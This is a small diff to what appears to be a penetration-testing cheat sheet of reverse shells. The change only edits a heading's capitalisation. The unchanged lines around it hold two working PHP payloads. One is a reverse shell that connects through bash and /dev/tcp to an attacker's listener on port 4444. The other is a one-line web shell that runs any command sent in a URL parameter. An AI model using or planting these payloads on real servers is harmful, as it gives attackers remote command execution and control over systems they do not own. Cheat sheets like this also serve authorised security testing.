@@ -72,7 +72,7 @@ python Shells:
 ---
 PHP
 ---
-php Shells:
+PHP Shells:
 [1] <?php shell_exec("bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'"); ?>
 
 [2: No Listener Required] <?php system($_GET['cmd']); ?>
